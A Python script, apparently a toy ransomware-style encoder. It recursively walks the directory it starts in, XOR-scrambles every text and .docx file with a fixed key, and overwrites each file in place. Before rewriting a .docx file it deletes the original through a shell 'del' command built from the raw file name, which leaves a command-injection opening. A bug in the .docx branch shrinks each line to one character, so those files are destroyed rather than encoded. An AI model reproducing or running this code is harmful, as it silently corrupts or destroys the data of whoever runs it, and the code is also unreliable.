import sys
import os
import magic
# import fitz # for pdf files
import docx

def valid_xml_char_ordinal(c):
    codepoint = ord(c)
    # conditions ordered by presumed frequency
    return (
        0x20 <= codepoint <= 0xD7FF or
        codepoint in (0x9, 0xA, 0xD) or
        0xE000 <= codepoint <= 0xFFFD or
        0x10000 <= codepoint <= 0x10FFFF
        )

def writeEncodedContent(encoded: list, file_name:str, sig: str):

    lenght = len(encoded)
    
    try:
        if sig == "ASCII":
            with open(file_name, "w") as file:
                for item in encoded:
                    file.write(item)
                file.close()
        elif sig == "MicrosoftOOXML":

            bashCommand = "del "+file_name
            os.system(bashCommand)

            for i in range(lenght):
                for item in encoded[i]:
                    valid = ''.join(c for c in item if valid_xml_char_ordinal(c))
                    encoded[i] = valid
                    
            encoded_doc = docx.Document()
            
            for line in encoded:
                encoded_doc.add_paragraph(line)
            encoded_doc.save(file_name)
        else:
            print("Strange format to write encoded data")
    except Exception as E:
        print("Have some error: ", E)
    else:
        return True
    return False

def encodeContent(content: list, signature: str):
    
    secret = 10
    lenght_of_content = len(content)
    
    if signature == "ASCII" or signature == "MicrosoftOOXML":
        for i in range(lenght_of_content):
            spam_stroke = ""
            for char in content[i]:
                spam_stroke += chr(ord(char)^secret)
            content[i] = spam_stroke
    else:
        print("Strange format with signature: ", signature)
    return content
    
# def getPDFText(file_name: str):
#     pdf_document = file_name
#     doc = fitz.open(pdf_document) 
#     for current_page in range(len(doc)):
#         page = doc.loadPage(current_page)
#         page_text = page.getText("text")
#         print("Стр. ", current_page+1, "\n\nСодержание;\n")
#         print(page_text)



def readCurrentFile(file_name: str):
    content_of_the_file = list()
    file_signature = "".join(str(magic.from_file(file_name)).split()[0])
    print("SIGNATURE:","".join(str(magic.from_file(file_name)).split()))
    if file_signature == "Microsoft":
        file_signature = "".join(str(magic.from_file(file_name)).split())
    
    if file_signature == "ASCII":
        with open(file_name, "r") as text_file:
            for line in text_file:
                content_of_the_file.append(line)

            text_file.close()

    elif file_signature == "MicrosoftOOXML":
        
        current_docx_file = docx.Document(file_name)
        current_paragraphs = current_docx_file.paragraphs
        
        for para in current_paragraphs:
            text = para.text
            if text == "":
                continue
            content_of_the_file.append(text)

    # elif file_signature == "PDF":
    #     getPDFText(file_name)

    else:
        print("Stange format of the file!")
    
    content_of_the_file = [line.rstrip() for line in content_of_the_file]

    encoded_content = encodeContent(content_of_the_file, file_signature)

    if writeEncodedContent(encoded_content, file_name, file_signature):
        print("Encoded was be finished completely!")
    else:
        print("Encoded was be finished with some errors")


def start(pwd: str):
    print('go ' + pwd)

    for dr in os.listdir(pwd):
        abs_path = os.path.join(pwd, dr)


        print('go to: ' + abs_path)

        if os.path.isdir(abs_path):
            print("It's Directory: ", end=" ")
            start(abs_path)
        else:
            print("Start Encode: "+ abs_path)
            readCurrentFile(abs_path)



if __name__ == "__main__":
    pwd = os.path.abspath(os.curdir)

    print("DIR: ", pwd)
    start(pwd)
